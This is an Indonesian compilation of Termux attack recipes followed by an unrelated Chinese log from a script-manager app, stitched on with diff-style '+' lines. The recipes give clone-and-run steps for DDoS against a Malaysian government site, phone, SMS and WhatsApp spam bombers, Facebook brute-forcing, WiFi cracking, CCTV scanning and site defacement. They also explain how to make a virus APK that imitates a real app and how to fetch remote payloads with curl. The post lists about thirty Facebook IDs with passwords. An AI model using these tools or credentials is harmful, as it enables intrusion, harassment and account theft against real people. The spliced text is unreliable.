BPC http://github.com/BLACK-PHANTOM-CYBER/DDOS-BPC/ cd DDOS-BPC python2 SPOONDDOS.sh =================== Ingat sebelum attack harus cek ip dulu karena ip bisa berubah-ubah Dgn cara Ketik di termux  ping malaysia.gov.my  Salam NASIONAL CYBER ASOSSIATION   LEBIH BAIK MENCOBA DAN GAGAL DARI PD TIDAK MENCOBA SAMA SEKALI   YG SEBAR GW DOAIN DAPAT PAHALA DAPAT PAHALA  Spam Call Unlimited $ pkg update && pkg upgrade $ pkg install php $ pkg install git $ git clone https://github.com/Aditya021/SpamCall $ cd SpamSms $ php SpamCall.php Masukan No Target ===> Mode Banyak (y/n) ===> UNTUK Spam Lebih Dari 1 JumlahSpam ===> Masukan Jumlah yang ingin dispam🙏🙏🙏🎭🎭🇲🇨  Siapa tau ada yang mau nih sc Cara install tool Mr.Rv1.1 $apt update && apt upgrade $pkg install git $pkg install gem $pkg install figlet $gem install lolcat $git clone https://github.com/Mr-R225/Mr.Rv1.1 $cd Mr.Rv1.1 $sh Mr.Rv1.1.sh  tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools  TOOL FSOCIETY $ git clone https://github.com/manisso/fsociety $ cd fsociety $ ./install.sh $ ls $ python2 fsociety.py  Assalamualaikum wr.wb Ni gw bagi SC DARK-FB(VIP-VPRO) & Gw bagi2 akun FB untuk kalian   Ni scripst HACK FB NEWW  (VIP.VPRO) NO LISENSI ∞∞∞≠BY MR.M4RCH3LL≠∞∞∞  $ pkg update && pkg upgrade $ pkg install git $ pkg install python2 $ pkg install mechanize $ pkg install request $ git clone https://github.com/m4rche3ll-cyber/dark-vpro $ cd dark-vpro $ python2 dark-vpro.py  NI akun FB untuk kalian smua  [OK✓] 100037694627558 | Syla12345 [✓] 100037988325303 | Feri123 [✓] 100037977879771 | Rifaa123  [OK✓] 100037091885666 | Sutris12345 [OK✓] 100037229983265 | Kahfi123  [OK✓] 100037166443432 | Munir123 [OK✓] 100037216997895 Nawawi123 [OK✓] 100037665398302 | Ponatim123 [OK✓] 100037974392506 | Andri123 [OK✓] 100037679447951 | Andika123 [✓] 100037946790741 | Sutres123 [✓] 100038002561349 | Aghni123 [✓] 100038113410131 | Blaster123 [✓] 100037710525968 | Noffal123 [✓] 100037988325303 | Feri123 [✓] 100037590739244 | Agus123 [✓] 100037576672206 | Kenyot123 [✓] 100037974392506 | Andri123 [OK✓] 100037714800465 | Dafa123 [OK✓] 100037869518631 | Ervan123 [OK✓] 100037354215333 Tans12345 [OK✓] 100037553282746 | Rifal123 [OK✓] 100037114456712 | Afif12345 [OK✓] 100037388647024 | Doni123 OK✓] 100037155800753 | Ikna123 [OK✓] 100037360233177 | Udin123 [OK✓] 100037089379481 | Dafa123 [OK✓] 100037388887005 Ridwan123 OK✓] 100037199269083 | Rifki123 [OK✓] 100037446305432 | Bima123  Gunakan dengan bijak !!!  Kalau kalian ingin tanya lebih / ada masalah Kalian bisa wa saya  No wa ADA DI SC NYA/ komen di bawah  Jangan lupa SUBSCRIBE (FREE) ,agar channel ini berkembang ,,& juga we akan membuat sc2 yang bermanfaat bagi kalian semua   Link grup wa : https://chat.whatsapp.com/KxTHh6xi9OgEEl41UDURE9  Oke , terimakasih:)  Wassalamu'alaikum wr.wb    Aldaynoobz  Selasa, 23 April 2019  Script-Termux                        We are anonymous                            We are legion                        We do not forgive                         We do not forget                                Expect us   ￼     DDOS ATTACK (TROJAN)  $ apt install git $ apt install python $ apt install bash $ apt install toilet $ apt install lolcat $ git clone https://github.com/BPCATTACKER/DOS-TOOKITS $ cd DOS-TOOKITS $ sh DoS-TOOKIT.sh  pilih no 1 lalu enter, lalu masukkan ip target dan enter attack sedang berjalan!  DDOS ATTACK  $  pkg update $  pkg upgrade $  pkg install python $  pkg install git $  git clone https://github.com/cyweb/  hammer $  cd hammer $  python hammer.py $  python3 hammer.py -s(ipnya cari sendiri di IP CHACKER) -p 80 -t 135   BOBOL-WIFI( root)  $ apt update && apt upgrade $ pkg install git $ git clone https://github.com/esc0rtd3w/wifi-hacker $ cd wifi-hacker/ $ chmod +x wifi-hacker.sh $ ./wifi-hacker.sh   HACK CCTV $ pkg update  $ pkg upgrade -y  $ pkg install python2 $ pkg install git  $ git clone https://github.com/GUNAWAN18ID/cctv.git  $ pip2 install requests  $ cd cctv  $ python2 scanner.py   SPAM CALL   $ pkg update $ pkg upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/MRRUXHANTAC270/RUXH4N_SPAM $ cd RUXH4N_SPAM $ python2 RUXH4N_SP4M.py8  Pilih nomor target jangan lupa pake (+62) ===>> +6285xxxxx Pilih jumlah spam ====>>>misal:100 Done :v  DEFACE WEBDAV  $  pkg update && pkg upgrade $  pkg install bash $  pkg install git $  pip2 install termocolor $  pip2 install lolcat $  git clone https://github.com/MRRUXHANTAC270/Deface-W3BD4F $  cd Deface-W3BD4F $  sh Webdav.sh  Masukan script html     Lalu pilih web vulnya >:)                  Cek               👇🏻👇🏻👇🏻  $apt install python2 $apt install git $apt install php $apt install bash $apt install nano $apt install toilet $git clone https://github.com/MRRUXHANTAC270/cek $cd cek $ls $sh cek.sh  HACK FACEBOOK TARGET  $pkg update && pkg upgrade $pkg install python2 $pkg install git $git clone https://github.com/MRRUXHANTAC270/Facebook-target $cd Facebook-target $python2 fb.py  SILAHKAN DOWNLOAD WORD LIST NYA TERLEBIH DAHULU https://sfile.mobi/4UugtYlifYk  Masukin id target ...  Lalu klik /sdcard/password.txt  SCRIPT DEFACE  $apt update && apt upgrade $apt install python2 $apt install git $apt install php $apt install bash $apt install nano $apt install toilet $git clone https://github.com/MRRUXHANTAC270/scriptdeface $  cd scriptdeface $  python2 now.py  SPAM WHATSAPP  $  apt update && apt upgrade $  apt install python2 $  apt install git $  apt install php $  apt install bash $  git clone https://github.com/MRRUXHANTAC270/sp4m $  cd sp4m $  php wa.php   Memper Cantik/Melihat V.Android Termux $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ gem install lolcat  $ cd ../usr/etc $ nano bash.bashrc cowsay -f eyes Cyber | lolcat toilet -f standard Indonesia -F gay neofetch date | lolcat ✓ Hack FB rombongan $ apt update && apt upgrade $ pkg install python2 git $ pip2 install mechanize $ git clone http://github.com/pirmansx/mbf $ ls $ cd mbf $ python2 MBF.py ✓ Hack FB ngincer $ apt update ( Enter ) $ apt upgrade ( Enter ) $ apt install python2 ( Enter ) $ pip2 install urllib3 chardet certifi idna requests ( Enter ) $ apt install openssl curl ( Enter ) $ pkg install libcurl ( Enter ) $ ln /sdcard ( Enter )  $ cd /sdcard ( Enter ) $ python2 fbbrute.py ( Enter ) ✓ Hack Gmail $ apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  Nih yang mau hack WiFi Khusus root $apt update $apt upgrade $apt install git $git clone https://github.com/esc0rtd3w/wifi-hacker $ls $cd wifi-hacker $ls $chmod +x wifi-hacker.sh $ls $./wifi-hacker.sh  cara uninstall tool termux  rm -rf toolsnya   Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy  CHATTING VIA TERMUX irssi /connet irc.freenode.net /nick w3wandroid /join #modol   $ pkg install irssi $ irssi $ /connect chat.freenode.net $ /nick 1235 12345 di ganti sesuai nama/nick agan $ /join #XCAteam   PERKIRAAN cuaca curl http://wttr.in/ (lokasi)    Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah   Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya   Menampilkan animasi kereta :v $ pkg install sl $ sl menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch  menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya   MEMUTAR MUSIC DI YOUTUBE VIA TERMUX $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dengan mengetik nomornya  musikan di termux $ pkg install mpv  $ mpv/sdcard/lagu.mp3  /sdcard/ bisa di ganti sesuai letak music    CRACK PASSWORD HASH $ git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ $ cd FHX-Hash-Killer $ python2 FHXHashKiller.py  $ git clone https://github.com/UltimateHackers/Hash-Buster $ cd Hash-Buster $ python2 hash.py  ASCII ART MAPS - pkg install update && upgrade - pkg install perl - git clone https://github.com/x-xsystm/maps.git - cd kaos - perl maps.pl - untuk Zoom tekan A - Password: (pejuang212)   CARA MENGHIAS TAMPILAN TERMUX $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ pkg install ncurses-utils $ pkg install ruby $ pkg install lolcat $ pkg install cowsay $ gem install lolcat $ nano .bashrc  clear blue='\e[1;34m' green='\e[1;32m' purple='\e[1;35m' cyan='\e[1;36m' red='\e[1;31m' white='\e[1;37m' yellow='\e[1;33m' NOW=`date "+%d.%m.%Y"` TIME=`date "+%H:%M"` cowsay -f eyes *Welcome To MRCX hacking tool* | lolcat toilet -f standard " *MRCX* " -F gay neofetch echo " Time : " $TIME | lolcat date | lolcat echo echo Username : marcyber team | lolcat echo Hostname : @MRCX~#root_system | lolcat echo echo @localhost:~# | lolcat echo root@localhost:~$ | lolcat echo -e $green echo root@MRCX:~$   TUTORIAL MEMBUAT VIRUS SEPERTI APLIKASI ASLINYA  Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug https://www.mediafire.com/file/6hs6y71ryw10uvw/vbug.zip 1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh  VBugMaker Termux -apt update && apt upgrade -apt install git -apt install python Donwload file ->http://upfile.mobi/YGwg8gQLuvv Pindah ke directory Next -unzip vbug.zip -mv vbug $HOME -cd vbug -ls -chmod +x vbug.py -python2 vbug.py #Done    BOOM SPAM DI TERMUX apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default aja  Spam bom mall $ pkg install update  $ pkg install upgrade $ pkg install wget $ pkg install php $ wget http://files-store.theprivat.ml/uploads/bom-mall.zip $ unzip bom-mall.zip $ cd bom-mall $ php run.php  (Install SpamTsel) $ pkg install curl  $ pkg install php  $ curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php  $ chmod 777 bombtsel.php $ php bombtsel.php 3) Tool Spam LITESPAM $ pkg install php $ pkg install toilet $ pkg install sh  LITESPAM $ pkg install git $ git clone https://github.com/4L13199/LITESPAM $ cd LITESPAM $ sh LITESPAM.sh atau  bash LITESPAM.sh Masukan Nomer nya...   Spammer GRAB $pkg install python2 $pip2 install requests $pkg install git $git clone http://github.com/p4kl0nc4t/Spammer-Grab $cd Spammer-Grab $python2 spammer.py nomor hp korban --delay 30  spam sms jdid 1.PKG install PHP 2.pkg install cURL 3.curl https://pastebin.com/raw/9BYy1 JVc -o jdid.php 4.php jdid.php   Hacking spammer by seni $apt update && apt upgrade $apt install python2 php $pip2 install requests $apt install nano $apt install git $git clone https://github.com/Senitopeng/ SpamSms.git $cd SpamSms $python2 mantan.py   HACKING DAN TRICK FB VIA TERMUX   AUTO BOOT FACEBOOK  $ git clone https://github.com/Senitopeng/BotFbBangDjon.git $ cd BotFbBangDjon $ python2 bangdjon.py  Cara crack id fb  https://findmyfbid.in/  git clone https://github.com/tomiashari/fb-autoreaction.git cd fb-autoreaction python2 fb-autoreaction  HACKING THOOLS MBF FACEBOOK $ pkg update && upgrade ‬$ pkg update && upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/pirmansx/mbf $ cd mbf $ python2 MBF.py  (HACKING FB LEWAT TERMUX) $ apt update $ apt upgrade  $ apt install python2 $ apt install python2-dev $ apt install wget $ dip2 install mechanize $ cd/sterage/emulated/0 $ python2 fbbrute.py ( yg tdi di download di tunda di luar folder )  Mungkin itu saja yang dapat saya bagikan, jika ada yang salah saya mohon maaf. Ingin Ikut Team Kami ? Klik Disini Website Team ? Klik Disini Website Umum ? Klik Disini  Di Atas Langit Masih Ada Langit Jadi, Jangan Sok Berkuasa Belum Tentu Anda Lebih Baik Dari Kami #WeDoNotForget #WeDoNotForgive #ExpectUs  Landy22  Salam Hangat,
+[2026-04-27 09:39:44] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:39:46] [脚本市场] README 翻译完成
+[2026-04-27 09:39:49] [脚本市场] API Key 已保存：本地服务 (127.0.0.1:8080)
+[2026-04-27 09:39:52] [脚本市场] 选中仓库：1200wd/bitcoinlib - The Python BitcoinLib provides developers with a wide range of tools to work with Bitcoin: manage wallets, private keys and addresses. Interact with the blockchain. And create complex transactions and scripts.
+[2026-04-27 09:39:53] [脚本市场] AI 分析失败：No available account for model: local-model
+[2026-04-27 09:39:54] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:39:56] [脚本市场] 选中仓库：eyeblech/cinecli - CineCLI is a cross-platform command-line movie browser built with Python.
+[2026-04-27 09:39:57] [脚本市场] AI 分析失败：No available account for model: local-model
+[2026-04-27 09:39:57] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:40:09] [脚本市场] README 翻译完成
+[2026-04-27 09:40:10] [脚本市场] README 翻译完成
+[2026-04-27 09:40:18] [脚本市场] 选中仓库：Alfredredbird/tookie-osint - Tookie is a advanced OSINT information gathering tool that finds social media accounts based on inputs.
+[2026-04-27 09:40:19] [脚本市场] AI 分析失败：No available account for model: local-model
+[2026-04-27 09:40:19] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:41:13] 📄 合并多个文件到一个excel.py
+[2026-04-27 09:41:13] ────────────────────────────────────────
+[2026-04-27 09:41:13] 合并多个文件到一个 Excel - 将多个 Excel/CSV 文件合并到一个工作簿的不同工作表中。
+
+功能：
+- 多文件合并：选择多个 Excel 文件，每个文件（或每个工作表）保存为独立的工作表
+- 智能命名：单工作表文件使用文件名作为工作表名，多工作表文件使用"文件名_原Sheet名"
+- 名称去重：工作表名重复时自动追加编号（如 "数据_1", "数据_2"）
+- 非法字符过滤：自动替换工作表名中的非法字符（\\ / ? * [ ] :）为下划线
+- 长度限制：工作表名超过 31 字符时自动截断
+- 自动列宽：根据标题和数据内容自动调整列宽（最小5，最大50）
+- 进度条：控制台显示文件处理进度
+- 完成提示音：合并完成后播放提示音（Windows）
+
+注意：
+- 使用 pandas 读取文件，支持 .xlsx / .xls / .csv 格式
+- 输出格式为 .xlsx
+- 不合并数据内容，每个源文件保留在独立的工作表中
+
+依赖：pandas, openpyxl
+[2026-04-27 09:41:15] 扫描完成：添加 1 个脚本，更新 8 个脚本
+[2026-04-27 09:41:16] 📄 test_local_ai.py
+[2026-04-27 09:41:16] （该脚本无头注释）
+[2026-04-27 09:41:19] 📄 test_local_ai.py
+[2026-04-27 09:41:19] （该脚本无头注释）
+[2026-04-27 09:41:19] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:41:19] 扫描到的所有导入：openai
+[2026-04-27 09:41:19] 第三方依赖：openai
+[2026-04-27 09:41:19] 
+[2026-04-27 09:41:19]   openai: 未安装
+[2026-04-27 09:41:19] 
+缺少直接依赖：openai
+[2026-04-27 09:41:19] 脚本「test_local_ai.py」缺少以下依赖： openai 是否立即安装？（将使用加速镜像源）
+[2026-04-27 09:41:20] 开始安装依赖: openai
+[2026-04-27 09:41:20] 尝试源 1/4: pypi.tuna.tsinghua.edu.cn
+[2026-04-27 09:41:21] Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple
+[2026-04-27 09:41:22] Collecting openai
+[2026-04-27 09:41:22] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/1e/c1/d6e64ccd0536bf616556f0cad2b6d94a8125f508d25cfd814b1d2db4e2f1/openai-2.32.0-py3-none-any.whl (1.2 MB)
+[2026-04-27 09:41:22] ---------------------------------------- 1.2/1.2 MB 9.0 MB/s  0:00:00
+[2026-04-27 09:41:22] Requirement already satisfied: anyio<5,>=3.5.0 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from openai) (4.13.0)
+[2026-04-27 09:41:22] Collecting distro<2,>=1.7.0 (from openai)
+[2026-04-27 09:41:22] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/12/b3/231ffd4ab1fc9d679809f356cebee130ac7daa00d6d6f3206dd4fd137e9e/distro-1.9.0-py3-none-any.whl (20 kB)
+[2026-04-27 09:41:22] Requirement already satisfied: httpx<1,>=0.23.0 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from openai) (0.28.1)
+[2026-04-27 09:41:23] Collecting jiter<1,>=0.10.0 (from openai)
+[2026-04-27 09:41:23] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/e5/43/5c2e08da1efad5e410f0eaaabeadd954812612c33fbbd8fd5328b489139d/jiter-0.14.0-cp314-cp314-win_amd64.whl (202 kB)
+[2026-04-27 09:41:23] Collecting pydantic<3,>=1.9.0 (from openai)
+[2026-04-27 09:41:23] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/f3/0a/fd7d723f8f8153418fb40cf9c940e82004fce7e987026b08a68a36dd3fe7/pydantic-2.13.3-py3-none-any.whl (471 kB)
+[2026-04-27 09:41:23] Collecting sniffio (from openai)
+[2026-04-27 09:41:23] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/e9/44/75a9c9421471a6c4805dbf2356f7c181a29c1879239abab1ea2cc8f38b40/sniffio-1.3.1-py3-none-any.whl (10 kB)
+[2026-04-27 09:41:23] Collecting tqdm>4 (from openai)
+[2026-04-27 09:41:23] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/16/e1/3079a9ff9b8e11b846c6ac5c8b5bfb7ff225eee721825310c91b3b50304f/tqdm-4.67.3-py3-none-any.whl (78 kB)
+[2026-04-27 09:41:23] Collecting typing-extensions<5,>=4.11 (from openai)
+[2026-04-27 09:41:23] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/18/67/36e9267722cc04a6b9f15c7f3441c2363321a3ea07da7ae0c0707beb2a9c/typing_extensions-4.15.0-py3-none-any.whl (44 kB)
+[2026-04-27 09:41:23] Requirement already satisfied: idna>=2.8 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from anyio<5,>=3.5.0->openai) (3.13)
+[2026-04-27 09:41:24] Requirement already satisfied: certifi in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from httpx<1,>=0.23.0->openai) (2026.4.22)
+[2026-04-27 09:41:24] Requirement already satisfied: httpcore==1.* in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from httpx<1,>=0.23.0->openai) (1.0.9)
+[2026-04-27 09:41:24] Requirement already satisfied: h11>=0.16 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from httpcore==1.*->httpx<1,>=0.23.0->openai) (0.16.0)
+[2026-04-27 09:41:24] Collecting annotated-types>=0.6.0 (from pydantic<3,>=1.9.0->openai)
+[2026-04-27 09:41:24] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/78/b6/6307fbef88d9b5ee7421e68d78a9f162e0da4900bc5f5793f6d3d0e34fb8/annotated_types-0.7.0-py3-none-any.whl (13 kB)
+[2026-04-27 09:41:24] Collecting pydantic-core==2.46.3 (from pydantic<3,>=1.9.0->openai)
+[2026-04-27 09:41:24] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/20/eb/59980e5f1ae54a3b86372bd9f0fa373ea2d402e8cdcd3459334430f91e91/pydantic_core-2.46.3-cp314-cp314-win_amd64.whl (2.1 MB)
+[2026-04-27 09:41:25] ---------------------------------------- 2.1/2.1 MB 4.2 MB/s  0:00:00
+[2026-04-27 09:41:25] Collecting typing-inspection>=0.4.2 (from pydantic<3,>=1.9.0->openai)
+[2026-04-27 09:41:25] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/dc/9b/47798a6c91d8bdb567fe2698fe81e0c6b7cb7ef4d13da4114b41d239f65d/typing_inspection-0.4.2-py3-none-any.whl (14 kB)
+[2026-04-27 09:41:25] Requirement already satisfied: colorama in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from tqdm>4->openai) (0.4.6)
+[2026-04-27 09:41:26] Installing collected packages: typing-extensions, tqdm, sniffio, jiter, distro, annotated-types, typing-inspection, pydantic-core, pydantic, openai
+[2026-04-27 09:41:38] Successfully installed annotated-types-0.7.0 distro-1.9.0 jiter-0.14.0 openai-2.32.0 pydantic-2.13.3 pydantic-core-2.46.3 sniffio-1.3.1 tqdm-4.67.3 typing-extensions-4.15.0 typing-inspection-0.4.2
+[2026-04-27 09:41:38] 成功安装包: openai (源: https://pypi.tuna.tsinghua.edu.cn/simple)
+[2026-04-27 09:41:38] [提示] 依赖未满足，取消运行：test_local_ai.py
+[2026-04-27 09:41:45] 📄 test_local_ai.py
+[2026-04-27 09:41:45] （该脚本无头注释）
+[2026-04-27 09:41:46] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:41:46] 扫描到的所有导入：openai
+[2026-04-27 09:41:46] 第三方依赖：openai
+[2026-04-27 09:41:46] 
+[2026-04-27 09:41:46]   openai: 已安装
+[2026-04-27 09:41:46] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 09:41:46] 所有依赖已满足
+[2026-04-27 09:41:46] 
+[2026-04-27 09:41:46] 开始运行：test_local_ai.py
+[2026-04-27 09:41:46] 运行路径：test_local_ai.py
+[2026-04-27 09:41:46] 
+[2026-04-27 09:41:51] 📄 test_local_ai.py
+[2026-04-27 09:41:51] （该脚本无头注释）
+[2026-04-27 09:41:51] Traceback (most recent call last):
+[2026-04-27 09:41:51]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 15, in <module>
+[2026-04-27 09:41:51]     print(response.choices[0].message.content)
+[2026-04-27 09:41:51]     ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:41:51] UnicodeEncodeError: 'gbk' codec can't encode character '\U0001f60a' in position 159: illegal multibyte sequence
+[2026-04-27 09:41:51] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:41:51] 扫描到的所有导入：openai
+[2026-04-27 09:41:51] 第三方依赖：openai
+[2026-04-27 09:41:51] 
+[2026-04-27 09:41:51]   openai: 已安装
+[2026-04-27 09:41:51] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 09:41:51] 所有依赖已满足
+[2026-04-27 09:41:51] 
+[2026-04-27 09:41:51] 开始运行：test_local_ai.py
+[2026-04-27 09:41:51] 运行路径：test_local_ai.py
+[2026-04-27 09:41:51] 
+[2026-04-27 09:41:51] 运行完成：test_local_ai.py，退出码：1
+[2026-04-27 09:41:53] 📄 test_local_ai.py
+[2026-04-27 09:41:53] （该脚本无头注释）
+[2026-04-27 09:41:53] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:41:53] 扫描到的所有导入：openai
+[2026-04-27 09:41:53] 第三方依赖：openai
+[2026-04-27 09:41:53] 
+[2026-04-27 09:41:53]   openai: 已安装
+[2026-04-27 09:41:53] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 09:41:53] 所有依赖已满足
+[2026-04-27 09:41:53] 
+[2026-04-27 09:41:53] 开始运行：test_local_ai.py
+[2026-04-27 09:41:53] 运行路径：test_local_ai.py
+[2026-04-27 09:41:53] 
+[2026-04-27 09:41:54] 📄 test_local_ai.py
+[2026-04-27 09:41:54] （该脚本无头注释）
+[2026-04-27 09:41:55] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:41:55] 扫描到的所有导入：openai
+[2026-04-27 09:41:55] 第三方依赖：openai
+[2026-04-27 09:41:55] 
+[2026-04-27 09:41:55]   openai: 已安装
+[2026-04-27 09:41:55] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 09:41:55] 所有依赖已满足
+[2026-04-27 09:41:55] 
+[2026-04-27 09:41:55] 开始运行：test_local_ai.py
+[2026-04-27 09:41:55] 运行路径：test_local_ai.py
+[2026-04-27 09:41:55] 
+[2026-04-27 09:41:56] Traceback (most recent call last):
+[2026-04-27 09:41:56]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 15, in <module>
+[2026-04-27 09:41:56]     print(response.choices[0].message.content)
+[2026-04-27 09:41:56]     ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:41:56] UnicodeEncodeError: 'gbk' codec can't encode character '\U0001f60a' in position 200: illegal multibyte sequence
+[2026-04-27 09:41:56] 运行完成：test_local_ai.py，退出码：1
+[2026-04-27 09:41:57] Traceback (most recent call last):
+[2026-04-27 09:41:57]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 15, in <module>
+[2026-04-27 09:41:57]     print(response.choices[0].message.content)
+[2026-04-27 09:41:57]     ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:41:57] UnicodeEncodeError: 'gbk' codec can't encode character '\U0001f60a' in position 29: illegal multibyte sequence
+[2026-04-27 09:41:57] 运行完成：test_local_ai.py，退出码：1
+[2026-04-27 09:41:58] Traceback (most recent call last):
+[2026-04-27 09:41:58]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 15, in <module>
+[2026-04-27 09:41:58]     print(response.choices[0].message.content)
+[2026-04-27 09:41:58]     ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:41:58] UnicodeEncodeError: 'gbk' codec can't encode character '\U0001f60a' in position 39: illegal multibyte sequence
+[2026-04-27 09:41:59] 运行完成：test_local_ai.py，退出码：1
+[2026-04-27 09:43:03] [脚本市场] 搜索：python script tool
+[2026-04-27 09:43:06] [脚本市场] API Key 已删除：本地服务 (127.0.0.1:8080)
+[2026-04-27 09:43:09] [脚本市场] 找到 8683 个仓库
+[2026-04-27 09:44:59] ─── 框架依赖检查 ───
+[2026-04-27 09:44:59] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 09:44:59] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 09:45:01] [脚本市场] 搜索：python script tool
+[2026-04-27 09:45:03] [脚本市场] 找到 8683 个仓库
+[2026-04-27 09:45:07] [脚本市场] 选中仓库：aahnik/tgcf - The ultimate tool to automate custom telegram message forwarding. Live-syncer, Auto-poster, backup-bot, cloner, chat-forwarder, duplicator, ... Call it whatever you like! tgcf can fulfill your custom needs.
+[2026-04-27 09:45:08] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:45:13] [脚本市场] API Key 已保存：本地服务 (127.0.0.1:8080)
+[2026-04-27 09:45:27] [脚本市场] README 翻译完成
+[2026-04-27 09:45:38] [脚本市场] AI 分析完成：aahnik/tgcf
+[2026-04-27 09:45:58] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-27 09:45:59] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:46:02] [脚本市场] API Key 已删除：本地服务 (127.0.0.1:8080)
+[2026-04-27 09:46:06] [脚本市场] API Key 已保存：本地服务 (127.0.0.1:8080)
+[2026-04-27 09:46:07] [脚本市场] README 翻译完成
+[2026-04-27 09:46:12] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-27 09:46:13] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:46:16] [脚本市场] AI 分析完成：InstaPy/InstaPy
+[2026-04-27 09:46:21] [脚本市场] README 翻译完成
+[2026-04-27 09:46:28] [脚本市场] AI 分析完成：InstaPy/InstaPy
+[2026-04-27 09:52:06] [脚本市场] 搜索：python script tool
+[2026-04-27 09:52:07] [脚本市场] 找到 8683 个仓库
+[2026-04-27 09:52:08] [脚本市场] 选中仓库：Alfredredbird/tookie-osint - Tookie is a advanced OSINT information gathering tool that finds social media accounts based on inputs.
+[2026-04-27 09:52:09] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:52:25] [脚本市场] README 翻译完成
+[2026-04-27 09:52:28] [脚本市场] AI 分析完成：Alfredredbird/tookie-osint
+[2026-04-27 09:53:07] [脚本市场] 选中仓库：aahnik/tgcf - The ultimate tool to automate custom telegram message forwarding. Live-syncer, Auto-poster, backup-bot, cloner, chat-forwarder, duplicator, ... Call it whatever you like! tgcf can fulfill your custom needs.
